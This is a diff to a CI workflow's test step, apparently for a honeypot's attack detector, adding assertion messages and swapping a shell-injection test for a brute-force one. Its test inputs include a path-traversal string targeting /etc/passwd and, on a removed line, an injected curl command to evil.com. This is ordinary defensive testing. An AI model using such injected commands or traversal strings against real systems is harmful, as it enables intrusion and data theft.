@@ -31,10 +31,10 @@ jobs:
         run: |
           python -c "
           from src.honeypot import detect_attack
-          assert 'sql_injection' in detect_attack(\"SELECT * FROM users\")
-          assert 'path_traversal' in detect_attack('../etc/passwd')
-          assert 'shell_injection' in detect_attack('; curl http://evil.com')
-          assert detect_attack('hello world') == []
+          assert 'sql_injection' in detect_attack(\"SELECT * FROM users\"), 'SQL injection not detected'
+          assert 'path_traversal' in detect_attack('../etc/passwd'), 'Path traversal not detected'
+          assert 'brute_force' in detect_attack('admin'), 'Brute force not detected'
+          assert detect_attack('hello world') == [], 'False positive detected'
           print('All attack detection tests passed!')
           "
 
